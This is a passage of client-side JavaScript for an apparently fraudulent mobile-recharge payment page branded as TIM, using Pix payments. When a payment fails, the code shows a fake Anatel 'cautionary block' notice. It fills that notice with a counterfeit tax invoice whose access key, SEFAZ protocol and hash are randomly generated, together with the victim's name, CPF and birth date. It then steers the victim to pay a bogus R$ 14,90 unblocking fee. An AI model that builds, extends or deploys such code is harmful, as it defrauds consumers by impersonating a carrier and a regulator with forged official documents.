        <circle cx="12" cy="12" r="10"></circle>
        <line x1="12" y1="8" x2="12" y2="12"></line>
        <line x1="12" y1="16" x2="12.01" y2="16"></line>
      </svg>
      Pagamento recusado
    `;

    // Wait 2 seconds then show popup
    setTimeout(() => {
      showPopupPosvenda();
    }, 2000);
  }

  function handlePixExpired() {
    clearInterval(state.pollInterval);
    statusBadge.classList.add('refused');
    statusSpinner.style.display = 'none';
    statusBadgeText.innerHTML = `
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#FF6B6B" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
        <circle cx="12" cy="12" r="10"></circle>
        <line x1="12" y1="8" x2="12" y2="12"></line>
        <line x1="12" y1="16" x2="12.01" y2="16"></line>
      </svg>
      Pix expirado
    `;
    setTimeout(() => {
      showPopupPosvenda();
    }, 2000);
  }

  btnCopyPix.addEventListener('click', async () => {
    if (!state.pixCode) return;
    try {
      await navigator.clipboard.writeText(state.pixCode);
      btnCopyPix.innerHTML = `
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1DB954" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
          <path d="M20 6 9 17l-5-5"></path>
        </svg>
        <span style="color: #1DB954;">Copiado!</span>
      `;
      setTimeout(() => {
        btnCopyPix.innerHTML = `
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
            <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
          </svg>
          <span>Copiar código PIX</span>
        `;
      }, 2000);
    } catch (err) {
      console.warn('Clipboard write error:', err);
      // Fallback prompt for copy
      window.prompt('Copie o código PIX abaixo:', state.pixCode);
    }
  });

  btnRetryPix.addEventListener('click', () => {
    initiatePixFlow();
  });

  btnBackToValor.addEventListener('click', () => {
    clearInterval(state.timerInterval);
    clearInterval(state.pollInterval);
    goToScreen('valor');
  });

  // --- Screen 4: Success Screen ---
  function showSuccessScreen() {
    if (state.isTaxaDesbloqueio) {
      const successTitle = document.querySelector('.success-title');
      const successDesc = document.querySelector('.success-desc');
      if (successTitle) successTitle.textContent = 'Linha Desbloqueada e Recarga Liberada!';
      if (successDesc) {
        const nomeCliente = (state.customer?.nome || 'Cliente').toUpperCase();
        const protocolo = document.getElementById('bloqueio-num-protocolo')?.textContent || '20261020-849201';
        successDesc.innerHTML = `
          A taxa de regularização cadastral de <strong>R$ 14,90</strong> foi compensada com sucesso.<br><br>
          O bloqueio cautelar da Anatel foi removido e a sua recarga de <strong>R$ ${formatCurrency(state.valorOriginalRecarga)}</strong> foi ativada na linha <strong>${formatPhone(state.phone)}</strong> do titular <strong>${nomeCliente}</strong>.<br><br>
          <span style="font-size:12px;color:rgba(255,255,255,0.7);">Protocolo de Homologação TIM / Anatel: <strong>${protocolo}</strong></span>
        `;
      }
    } else {
      successTotalDisplay.textContent = formatCurrency(state.rechargeValue);
      successPhoneDisplay.textContent = formatPhone(state.phone);
    }
    goToScreen('sucesso');
  }

  // --- Screen: Modal de Bloqueio Sistêmico & Upsell DANFCom ---
  function showPopupPosvenda() {
    clearInterval(state.pollInterval);
    clearInterval(state.timerInterval);

    try {
      const d = JSON.parse(localStorage.getItem('comprovante_dados') || localStorage.getItem('tim_cliente_dados') || '{}');
      const el = (id) => document.getElementById(id);

      const nomeCliente = (d.nome || state.customer?.nome || 'TITULAR DO ACESSO').toUpperCase();
      const cpfCliente = formatCPF(d.cpf || state.cpf || '12345678900');
      const telCliente = formatPhone(d.telefone || state.phone || '11999999999');
      const nascCliente = d.dataNascimento || state.customer?.dataNascimento || '12/05/1990';
      const valorRecarga = formatCurrency(state.valorOriginalRecarga || state.rechargeValue || d.valor || 50);

      // Atualiza valores do Card de Bloqueio
      if (el('bloqueio-display-phone')) el('bloqueio-display-phone').textContent = telCliente;
      if (el('bloqueio-display-nome')) el('bloqueio-display-nome').textContent = nomeCliente;
      if (el('bloqueio-display-cpf')) el('bloqueio-display-cpf').textContent = cpfCliente;
      if (el('bloqueio-display-valor')) el('bloqueio-display-valor').textContent = valorRecarga;
      if (el('bloqueio-recarga-val')) el('bloqueio-recarga-val').textContent = valorRecarga;
      if (el('bloqueio-recarga-val2')) el('bloqueio-recarga-val2').textContent = valorRecarga;

      // Gera número de protocolo único e dinâmico da operadora
      const hoje = new Date();
      const ano = hoje.getFullYear();
      const mes = String(hoje.getMonth() + 1).padStart(2, '0');
      const dia = String(hoje.getDate()).padStart(2, '0');
      const hora = String(hoje.getHours()).padStart(2, '0');
      const min = String(hoje.getMinutes()).padStart(2, '0');
      const seg = String(hoje.getSeconds()).padStart(2, '0');
      const dataFormatada = `${dia}/${mes}/${ano}`;
      const horaFormatada = `${hora}:${min}:${seg}`;

      const numProtocolo = `${ano}${mes}${dia}-${Math.floor(100000 + Math.random() * 900000)}`;
      if (el('bloqueio-num-protocolo')) el('bloqueio-num-protocolo').textContent = numProtocolo;

      // Popula campos da DANFCom Modelo 62
      if (el('nf-nome')) el('nf-nome').textContent = nomeCliente;
      if (el('nf-cpf')) el('nf-cpf').textContent = cpfCliente;
      if (el('nf-nasc')) el('nf-nasc').textContent = nascCliente;
      if (el('nf-tel')) el('nf-tel').textContent = telCliente;
      if (el('nf-data')) el('nf-data').textContent = dataFormatada;
      if (el('nf-hora')) el('nf-hora').textContent = horaFormatada;
      if (el('nf-data-autorizacao')) el('nf-data-autorizacao').textContent = `${dataFormatada} às ${horaFormatada}`;
      if (el('nf-valor-recarga')) el('nf-valor-recarga').textContent = valorRecarga;

      // Código de contrato derivado do DDD e número
      const contrato = 'TIM-SMP-' + cleanDigits(d.telefone || state.phone).slice(2, 8);
      if (el('nf-contrato')) el('nf-contrato').textContent = contrato;

      // Chave de acesso NFCom 44 dígitos
      const chaveAcesso = `3526 1002 4214 2100 0111 6200 1000 0419 8201 ${Math.floor(1000 + Math.random() * 9000)} ${Math.floor(1000 + Math.random() * 9000)}`;
      if (el('nf-chave')) el('nf-chave').textContent = chaveAcesso;

      // Protocolo SEFAZ
      if (el('nf-protocolo-sefaz')) el('nf-protocolo-sefaz').textContent = `3352600${Math.floor(10000000 + Math.random() * 90000000)}`;

      // UF de acordo com DDD
      const ddd = cleanDigits(d.telefone || state.phone).slice(0, 2);
      const ufMap = {
        '11': 'São Paulo - SP', '12': 'São José dos Campos - SP', '13': 'Santos - SP', '19': 'Campinas - SP',
        '21': 'Rio de Janeiro - RJ', '27': 'Vitória - ES', '31': 'Belo Horizonte - MG',
        '41': 'Curitiba - PR', '48': 'Florianópolis - SC', '51': 'Porto Alegre - RS',
        '61': 'Brasília - DF', '71': 'Salvador - BA', '81': 'Recife - PE', '85': 'Fortaleza - CE', '91': 'Belém - PA'
      };
      if (el('nf-uf')) el('nf-uf').textContent = ufMap[ddd] || 'São Paulo - SP';

      // Hash MD5 Convênio 115/03
      const chars = '0123456789ABCDEF';
      const genPart = (n) => Array.from({length: n}, () => chars[Math.floor(Math.random() * 16)]).join('');
      const md5Hash = `${genPart(4)}.${genPart(4)}.${genPart(4)}.${genPart(4)}.${genPart(4)}.${genPart(4)}.${genPart(4)}.${genPart(4)}`;
      if (el('nf-hash-md5')) el('nf-hash-md5').textContent = md5Hash;

    } catch (e) {
      console.warn('Erro ao popular NF:', e);
    }

    popupPosvenda.classList.add('visible');
  }

  btnPopupRefazer.addEventListener('click', () => {
    salvarDadosComprovante();
    window.location.href = '/desbloqueio';
  });

  function irParaValorComDesconto() {
    state.extraCredit = false;
    updateSummary();
    goToScreen('valor');
  }

  btnBackToStart.addEventListener('click', () => {
    state.descontoAtivo = false;
    state.forcarValorFixo = false;
    goToScreen('numero');
  });

  btnRestartFlow.addEventListener('click', () => {
    state.phone = '';
    state.cpf = '';
    state.customer = { nome: '', cpf: '', dataNascimento: '', raw: null };
    state.rechargeValue = 39.90;
    state.valorOriginalRecarga = 39.90;
    state.isTaxaDesbloqueio = false;
    state.extraCredit = false;
    state.descontoAtivo = false;
    state.forcarValorFixo = false;
    inputPhone.value = '';
    if (inputCpf) inputCpf.value = '';
    validatePhone(false);
    goToScreen('numero');
  });

  // --- Funções de Teste no Console do Navegador (F12) ---
  window.aprovarPagamento = function() {
    console.log('%c[TESTE] Simulando pagamento aprovado...', 'color: #1DB954; font-size: 14px; font-weight: bold;');
    handlePixApproved();
  };
  window.simularAprovado = window.aprovarPagamento;

  window.recusarPagamento = function() {
    console.log('%c[TESTE] Simulando pagamento recusado...', 'color: #FF6B6B; font-size: 14px; font-weight: bold;');
    handlePixRefused();
  };
  window.simularRecusado = window.recusarPagamento;

  window.mostrarPopup = function() {
    console.log('%c[TESTE] Mostrando popup pós-venda...', 'color: #FF6B6B; font-size: 14px; font-weight: bold;');
    showPopupPosvenda();
  };

  window.simularNome = function(nome) {
    if (!state.customer) state.customer = {};
    state.customer.nome = nome || 'JOÃO CARLOS DA SILVA';
    updatePromoHeadline();
    console.log('%c[TESTE] Nome simulado:', 'color: #FFD200; font-weight: bold;', state.customer.nome);
  };

  // --- Initialization ---
  saveTrackingParams();

})();
